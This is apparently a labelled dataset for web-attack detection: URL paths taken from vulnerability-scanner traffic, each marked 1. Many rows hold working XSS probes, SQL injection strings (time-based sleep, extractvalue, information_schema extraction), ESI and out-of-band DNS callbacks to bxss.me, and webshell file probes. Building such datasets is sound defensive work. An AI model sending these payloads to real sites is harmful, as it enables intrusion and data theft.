sentences	labels
/****/zzxxgk'""()&%<acx><script >8m5j(9279)</script>/tjj/zfxxgkml_2127/xwfbh_2065/list.html \r\n\r\n 	 1
/**/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 \r\n\r\n 	 1
/***/reporting/admin/notificationpopup.php?new=1&type=cr&height=alert(777) \r\n\r\n 	 1
/****/index.php?title=acunetixtest12ab0a&action=submit \r\n\r\n 	 1
/***/col35/index'""()&%<acx><script >v8q9(9777)</script>.html \r\n\r\n 	 1
/****/zjdt/gcjsbzgl' and 2*3*8=6*8 and 'cbhn'='cbhn/gcjybz.htm \r\n\r\n 	 1
/****/? \r\n\r\n 	 1
/****/20210125/javascript:void(0); \r\n\r\n 	 1
/*****/mydevice/loggedout.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 1
/xwdt'||'/****/czjs/gzdt.htm \r\n\r\n 	 1
/********/system/booklist.php \r\n\r\n 	 1
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/lib/easyui/plugins/jquery.draggable.js \r\n\r\n 	 1
/******/caches_model/caches_data/pug.php \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(1238)</script>?_=1630311813673 \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 2548=7223-- tydm \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos="".gethostbyname(lc(""hitez"".""ywjmmnledbf56.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(99).chr(78).chr(103).chr(74).""&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/********/main/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search \r\n\r\n 	 1
/**/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) \r\n\r\n 	 1
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/zfxxgkzd/1.htm \r\n\r\n 	 1
/******************/ onmouseover=rleyje(6261) var=  \r\n\r\n 	 1
/**/sudu/javascript:void(0); \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=if(now()=sysdate(),sleep(15),0) \r\n\r\n 	 1
/**********/system/2021/07/25/013425058.shtml \r\n\r\n 	 1
/************/template/jcse'||'/110105008056111/16/images/plugin/voice/hzrecorder.js \r\n\r\n 	 1
/**/system/2021/12/09/javascript:void(0); \r\n\r\n 	 1
/****/byszf/sz/'""()&%<acx><script >aavn(9449)</script>/t20210806_185416.html \r\n\r\n 	 1
/****/618/images/ \r\n\r\n 	 1
/****/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 1
/**/vc/interface/ \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc') and 1=2 and ('1'='1 \r\n\r\n 	 1
/****/czgk/'""()&%<acx><script >5vc5(9813)</script>/gdyx/ \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219%' and 4400=3632 and '%%'='%&perpage=24&templet=1&token=1 \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list.html?new="".gethostbyname(lc(""hitcb"".""jpxidtdla2b74.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(118).chr(66).chr(108).chr(70)."" \r\n\r\n 	 1
/****/template.cfm?fusebox.ajax="">alert(777)&myfusebox.originalcircuit=clogin \r\n\r\n 	 1
/****/web/search?channelid=222832&searchword=; waitfor delay '0:0:2 \r\n\r\n 	 1
/******/index.php?title=acunetixtest692b83&action=submit \r\n\r\n 	 1
/*******/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 1
/****/90sec.php/****/90sec.php \r\n\r\n 	 1
/*/191211-8/index/543527'""()&%<acx><script >i44y(9665)</script>b53aa888f3c059262ff1665247.css \r\n\r\n 	 1
/*******/webinterface/function/?command=getxmllisting&format=jsonobj&path=%<script>alert(777)</script>&random=0.3300707341372783 \r\n\r\n 	 1
/****/system/2017/06/06/javascript:window.print() \r\n\r\n 	 1
/********/web/sa3/addholiday.do \r\n\r\n 	 1
/****/20210701/javascript:void(0); \r\n\r\n 	 1
/****/files.php?folder="">alert(777) \r\n\r\n 	 1
/**/ui/lib/easyui/themes"" and 2*3*8=6*8 and ""ngj9""=""ngj9/bootstrap/messager.css \r\n\r\n 	 1
/****/20201009/javascript:void(0); \r\n\r\n 	 1
/**/system/2021/07/07/javascript:void(0); \r\n\r\n 	 1
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 1
/***/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
/****/zjdt/zjdt/gzdt'||'/144.htm \r\n\r\n 	 1
/*****/20210915/javascript:void(0); \r\n\r\n 	 1
/***/0/01/30/79/1307910_544389.jpg \r\n\r\n 	 1
/****/admin/dash_additem.php?additem_form=alert(777); \r\n\r\n 	 1
/****/spot-13473.html \r\n\r\n 	 1
/***/wxzcgk/201801/t20180115_669144.html \r\n\r\n 	 1
/*******/gfa2m1q.php \r\n\r\n 	 1
/****/category/fengxianjingshi?page=1 and 0410=2066-- \r\n\r\n 	 1
/****/category/jishuchuangxin?page=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  \r\n\r\n 	 1
/****/bmkx/"".gethostbyname(lc(""hitaw"".""pfqhnbbyd2ca2.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(119).chr(77).chr(110).chr(86).""/ \r\n\r\n 	 1
/****/web/search?page=-1) or 9041=6266#&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/************/template/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 1
/******/wulv.php \r\n\r\n 	 1
/************/categorysearch.do?cateid=1&eq=1&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=bxss.me/t/xss.html? \r\n\r\n 	 1
/**/index.php?do=post&id=308&c=dt&a=goods& \r\n\r\n 	 1
/****/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15"><script>alert(777);</script> \r\n\r\n 	 1
/******/resource/js%' and 2*3*8=6*8 and '1prw'!='1prw%/ajax.js \r\n\r\n 	 1
/wp-content/*******/nextgen-gallery/nggallery.php?test-head='"">alert(777); \r\n\r\n 	 1
/****/wp-content/plugins/easyrotator-for-wordpress/guzhici.php \r\n\r\n 	 1
/****/byszf/sz/202108/t20210806_185416.html?leader="".gethostbyname(lc(""hituh"".""lzqyavbw494f5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(97).chr(90).chr(121).chr(69)."" \r\n\r\n 	 1
/col%' and 2*3*8=6*8 and 'en5d'!='en5d%/*****/index.html \r\n\r\n 	 1
/*****/system/2021/08/20/javascript:void(); \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000') and 1488=1488 and '1'='1 \r\n\r\n 	 1
/******/lxyz/index.shtml/<img src="javascript:alert(332)"> \r\n\r\n 	 1
/****/zfcwhy/202107/"".gethostbyname(lc(""hitez"".""vbjoqsfa8c19b.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(73).chr(115).chr(86).""_2938511.html \r\n\r\n 	 1
/**/news/xwygx/202109/t20210930_317981.html and 1>1 \r\n\r\n 	 1
/**/ui'""()&%<acx><script >b7ng(9824)</script>/widgets/scrollup/css/themes/image.css \r\n\r\n 	 1
/****/zzxxgk/tjj'||'/zfxxgkml_2127/hygq_2064/list.html \r\n\r\n 	 1
/****/web/search?channelid=254846&searchword=天津 and 9086=(select 9086 from pg_sleep(5)) \r\n\r\n 	 1
/***/signin.do?urll="><script>alert(document.domain)</script> \r\n\r\n 	 1
/****/ghgz/202012/t20201221_265273.html and 1=1 \r\n\r\n 	 1
/*******/ncus2.php \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'l2bv'='l2bv/******/bzxajgc1/1.htm \r\n\r\n 	 1
/*****/system/2013/12/31/011275111.shtml \r\n\r\n 	 1
/******/this.attr('action')||window.location.tostring(),type:this.attr('method')||'get'},options||{});var \r\n\r\n 	 1
/zwxx_11337/****/201909/t20190916_1740542.html \r\n\r\n 	 1
/******/api/saved_objects/_find?fields=title&per_page=1&search=*&search_fields=title&type=index-pattern \r\n\r\n 	 1
/*****/system/2021/11/02/javascript:window.print() \r\n\r\n 	 1
/******/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); \r\n\r\n 	 1
/************/search/mainframe.do?begin=&end=&eq=&oq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&p=1&pg=1&pos=&pq=&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(710)">?_=1630311559131 \r\n\r\n 	 1
/if(now()=sysdate(),sleep(15),0)/****/bmleft.html \r\n\r\n 	 1
/****/2020wzqh/wzqh_qwjd/202011/t20201130_259587.html' and 'x'='x \r\n\r\n 	 1
/******/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(922618074))) --  \r\n\r\n 	 1
/****/图说哈电/*/-->'""></iframe></script></style></title></textarea><script >alert(53142)</script> \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'tjrv'='tjrv/******/ncwywfgz/wzs/qtxs/xmb_gzdxb.htm \r\n\r\n 	 1
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/main.css \r\n\r\n 	 1
/'""()&%<acx><script >j2yp(9130)</script>/**/lib/easyui/themes/bootstrap/linkbutton.css \r\n\r\n 	 1
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=&calendar_id=1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=<script language='php'>echo 10516*61501;</script> \r\n\r\n 	 1
/****/web/search/search?page=3&channelid=287219') and 7674=(select 7674 from pg_sleep(5)) and ('msgp'='msgp&searchword=1&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(620)</script>?_=1630311535666 \r\n\r\n 	 1
/******/resource/if(now()=sysdate(),sleep(12),0)/newcalendar/my97datepicker.htm \r\n\r\n 	 1
/******/business-area'||'/quotation-service/ \r\n\r\n 	 1
/******/admin/system.html?step=2&device=et"/><script>alert(777);</script>bh0 \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1"and/**/extractvalue(1,concat(char(126),md5(1406936615)))and"&type=1 \r\n\r\n 	 1
/****/2020wzqh/wzqh_qydt/202012/t20201205_264448.html' and 'x'='x \r\n\r\n 	 1
/****/2020wzqh/wzqh_zyjs//*/-->'""></iframe></script></style></title></textarea><script >alert(26423)</script> \r\n\r\n 	 1
/****/byszf/201912/t20191230_145977.html?leader="".gethostbyname(lc(""hitre"".""xtupaaoxff5d3.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(108).chr(90).chr(110).chr(66)."" \r\n\r\n 	 1
/****//750/5b9mt7hd/xhr_send?t=1629436664774 \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/******/system/2020/06/04/javascript:void(); \r\n\r\n 	 1
/****/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 1
/*******/wulv.php \r\n\r\n 	 1
/*****/20210816/javascript:void(0); \r\n\r\n 	 1
/****/system/2020/12/02/javascript:window.close(); \r\n\r\n 	 1
/**/system/2021/07/23/javascript:void(0); \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 7846=8652 \r\n\r\n 	 1
/***********/jinrongqihuo/guzhiqihuo/2021-0""xor(if(now()=sysdate(),sleep(9),0))xor""z-22/1713.html \r\n\r\n 	 1
/****/ \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(205)">?_=1630311327038 \r\n\r\n 	 1
/*****/20211115/javascript:void(0); \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*/layout.css \r\n\r\n 	 1
/********/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 1
/*******/3q7c60v.php \r\n\r\n 	 1
/*****/system/2019/10/18/javascript:void(0); \r\n\r\n 	 1
/****/system/2018/08/22/javascript:window.close(); \r\n\r\n 	 1
/****/actionhandler/ajax_managed_services.php \r\n\r\n 	 1
/xwdt%' and 2*3*8=6*8 and 'zqj5'!='zqj5%/****/ghby/gzdt/1.htm \r\n\r\n 	 1
socket.gethostbyname(""hitel"" ""crzuykif4f453.bxss.me."")[3].to_s) ""/***************/16/images/result.css \r\n\r\n 	 1
/images'||'/*/hanweb.css \r\n\r\n 	 1
/**/ui/widgets/scrollup/css/themes/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.css \r\n\r\n 	 1
/*******/495bl.php \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(1202)</script>?_=1630311796458 \r\n\r\n 	 1
/******/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 1
/***/2021/10/11/art_http://bxss.me/t/xss.html? \r\n\r\n 	 1
/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=if(now()=sysdate(),sleep(15),0)&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/**/system/2021/09/27/javascript:void(0); \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/ncwywfgz/1.htm \r\n\r\n 	 1
/***/800/11/09/90/11099074_998345.jpg \r\n\r\n 	 1
/******/business-area/warehouse-services/2017-03-22/0'xor(if(now()=sysdate(),sleep(6),0))xor'z.html \r\n\r\n 	 1
socket.gethostbyname('hitrf' 'rslqqevdca891.bxss.me.')[3].to_s) '/*******/jquery.panel.js \r\n\r\n 	 1
/*******/2015/diretory.php \r\n\r\n 	 1
/**/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg \r\n\r\n 	 1
/************/template/jcse/'""()&%<acx><script >jfeu(9737)</script>/16/images/searchbtn.js \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/waterpull'||'/pinterest_grid.js \r\n\r\n 	 1
/******/21'""()&%<acx><script >pnqn(9637)</script>/rest.css \r\n\r\n 	 1
/***/0/11/38/74/11387446_426302.jpg \r\n\r\n 	 1
/****/system/2021/02/10/javascript:window.print() \r\n\r\n 	 1
/****/zjdt' and 2*3*8=6*8 and '0xws'='0xws/zjdt.htm \r\n\r\n 	 1
/******/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
/****/wp-admin/admin.php?page=thecartpress/admin/addressedit.php&address_id='"><script>alert(77729;</script> \r\n\r\n 	 1
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 1
/****/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 1
/**/index.php?action=list&order=name&srt=yes&lang=en"/><script>alert(777);</script> \r\n\r\n 	 1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqxxhjsb/\"javascript:void(0)\" \r\n\r\n 	 1
/****/20180524/javascript:void(0); \r\n\r\n 	 1
/***/col5/index.html/""><script>alert(322)</script> \r\n\r\n 	 1
/***/0/10/08/90/10089020_823365.jpg \r\n\r\n 	 1
/****/http://bxss.me/t/xss.html? \r\n\r\n 	 1
/****/czgk/bmjs/zzqjcyxt/jfqrmjcy/\"javascript:void(0)\" \r\n\r\n 	 1
/****/szyw/2020_szyw/' and 'x'='x \r\n\r\n 	 1
/***//<script>alert`95158`</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111//xfs.bxss.me/images/css.js \r\n\r\n 	 1
/****/system/2021/12/06/javascript:window.close(); \r\n\r\n 	 1
/****/web/search?searchword=1&channelid=287219%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &perpage=24&templet=1&token=1 \r\n\r\n 	 1
/*/action'||'/showinfo/ \r\n\r\n 	 1
/*****/iching'||'.css \r\n\r\n 	 1
/art"" and 2*3*8=6*8 and ""plj7""=""plj7/****/7/12/art_35_234319.html \r\n\r\n 	 1
/****/czgk/bmyjs/zzqfyxt/hyxrmfy/\"javascript:void(0)\" \r\n\r\n 	 1
/***/interface/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271') or 9918=9918  \r\n\r\n 	 1
/***/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 1
/****/system/count/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/xxgkzn/list' and 2*3*8=6*8 and 'svtg'='svtg.html \r\n\r\n 	 1
/***/20160714/1710.html/*/-->'""></iframe></script></style></title></textarea><script >alert(12622)</script> \r\n\r\n 	 1
/****/bysw/swsj' and 2*3*8=6*8 and 'esoq'='esoq/ \r\n\r\n 	 1
/****/admin/edit.php?title="">pt>alert(777);< /script>pt> \r\n\r\n 	 1
socket.gethostbyname('hitvc' 'qjhngaqfacbb7.bxss.me.')[3].to_s) '/**/images/main.css \r\n\r\n 	 1
/*******/taglib/ci.php \r\n\r\n 	 1
/****/if(now()=sysdate(),sleep(12),0)/gcjsbzgl/gcjybz/1.htm \r\n\r\n 	 1
/****/bysw/swsj/201610/t20161010_456.html?leader=苏君'""()&%<acx><script >pizc(9255)</script> \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt/zwdt_v3.css \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419' and 0173=9168 and '1'='1 \r\n\r\n 	 1
/*****/slidetrans.js/<img src="javascript:alert(17)"> \r\n\r\n 	 1
/************/template'||'/jcse/110105008056111/16/images/common.js \r\n\r\n 	 1
/****/web/search?channelid=253477&keyword=the&orderby=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&outlinepage=10&page=2&perpage=15&searchword=the \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(373)</script>?_=1630311380750 \r\n\r\n 	 1
/**/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(925946311))) --  \r\n\r\n 	 1
/******/download/downfile.jsp?classid=0') and 3223=3223 and ('eure'='eure&filename=f8c2ed3e25ea4c269bf2e627a90b568a.docx \r\n\r\n 	 1
/**********/newscenter/javascript:void(); \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(511)</script>?_=1630311495191 \r\n\r\n 	 1
/****/zjdt/zjdt' and 2*3*8=6*8 and 'beze'='beze.htm \r\n\r\n 	 1
/****/zfxxgk1/if(now()=sysdate(),sleep(12),0)/ghxx.htm \r\n\r\n 	 1
/****/rsxcsx/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 1
/******/rss/rssfeed.jsp?colid=34%';select sleep(5) \r\n\r\n 	 1
/***/col40/index.html/""><script>alert(915)</script> \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid[0]=exp&i_articleid[1]==extractvalue(1,concat(char(126),md5(1003116456)))&i_columnid=15&i_webid=1&type=3 \r\n\r\n 	 1
/****/category/zhikubaogao?page=1' or 6437=2802 /* \r\n\r\n 	 1
/****/web/search?channelid=254846&searchword=北京' && benchmark(2999999,md5(now())) order by 160  \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000') and 8651=8651 and ('1'='1 \r\n\r\n 	 1
/**********/2021-0""xor(if(now()=sysdate(),sleep(3),0))xor""z-02 .html \r\n\r\n 	 1
socket.gethostbyname('hityg' 'axrimmwsd2d4d.bxss.me.')[3].to_s) '/******/searchbtn.js \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/voice/voicerecorder'||'.js \r\n\r\n 	 1
/****/main/admin/configure_extensions.php?display=</script><script>confirm(777)</script> \r\n\r\n 	 1
/*****/general/diary/new/submit.php \r\n\r\n 	 1
/******/main/messages/outbox.php?f=social"" onmouseover=""confirm(777) \r\n\r\n 	 1
/****/rsxcsx/fzrxc/ \r\n\r\n 	 1
/****/category/redianguanzhu?page=1 and 2150=2150-- \r\n\r\n 	 1
/****/mytag_js.php? aid=9090 \r\n\r\n 	 1
/*/170822-'""()&%<acx><script >yzkr(9042)</script>/index/0a0f5da36e596bc2aa4482bbd409d1ea.css \r\n\r\n 	 1
/****/category/silugonggao?page=1'"()&%<acu><script>9112(9131)</script> \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml%' and 2*3*8=6*8 and 'xf0y'!='xf0y%_2127/hygq_2064/list.html \r\n\r\n 	 1
/****/system/2021/12/06/javascript:window.print() \r\n\r\n 	 1
/****/qtgkxx/201806/ \r\n\r\n 	 1
/****/system/2017/02/15/javascript:dozoom(12) \r\n\r\n 	 1
/******/20190808.swf/<img src="javascript:alert(182)"> \r\n\r\n 	 1
/******/system/2021/06/09/javascript:void(); \r\n\r\n 	 1
/fzgn' and 2*3*8=6*8 and 'cfte'='cfte/****/ \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=') or 7902=7763  \r\n\r\n 	 1
/***/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 1
/**/system/2021/07/16/javascript:void(0); \r\n\r\n 	 1
/*****/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 1
/******/system/2011/12/01/010556888.shtml \r\n\r\n 	 1
/***/dependencies/index?search="">alert(/777/) \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(461)</script>?_=1630311416553 \r\n\r\n 	 1
/****/swb/ltgsz.com?n=11';select sleep(5)# \r\n\r\n 	 1
/****/system/2021/05/07/javascript:dozoom(9) \r\n\r\n 	 1
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033%' or 8876=6831 and '%%'='%&owner=1707212448 \r\n\r\n 	 1
/****/system/2020/08/26/javascript:window.close(); \r\n\r\n 	 1
/jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js \r\n\r\n 	 1
/****/system/2021/10/16/javascript:window.print() \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033') and 2512=2512 and ('1'='1&owner=1707212448 \r\n\r\n 	 1
/**/ui/widgets/scrollup/js/http://bxss.me/t/fit.txt.js \r\n\r\n 	 1
/******/ \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448&wbfileid=51419%') or 6755=6328  \r\n\r\n 	 1
socket.gethostbyname(""hityi"" ""rhekvivta103e.bxss.me."")[3].to_s) ""/******/ie6fixed/ie6fixed.js \r\n\r\n 	 1
/****/system/2021/03/03/javascript:window.print() \r\n\r\n 	 1
/******/abantecart/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> \r\n\r\n 	 1
/****/help/search.php?query=""onmouseover=""alert(1); \r\n\r\n 	 1
/**/ourbusiness/projectcontracting/201412/ \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') and 9711=9711 and '%'=' \r\n\r\n 	 1
/******/system/2019/08/27/javascript:window.print() \r\n\r\n 	 1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) \r\n\r\n 	 1
/****//529/on70wgty/xhr_send?t=1632344370370 \r\n\r\n 	 1
/*******/3atc1.php \r\n\r\n 	 1
/*/public/viewclick/?addclick=1&classid=1 waitfor delay '0:0:12.591000000000001' -- &id=1285 \r\n\r\n 	 1
/****/system/2021/09/07'"/><img src=javascript:alert(1474) /013446963.shtml \r\n\r\n 	 1
/****/mswpmm/common/signin.aspx?tbpassword=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/****/zfwjn/1088/1101/list.html?new=0.5927188119755153<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 1
/****/web/search?channelid=299868%') or 2180=2180 /*&perpage=1000 \r\n\r\n 	 1
/*******/696fo.php \r\n\r\n 	 1
/******/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 1
/**/system/2021/10/08/012205521.shtml \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/bxss.me/main.css \r\n\r\n 	 1
/****/system/2021/04/22'"/><iframe src=javascript:alert(2461) /013373702.shtml \r\n\r\n 	 1
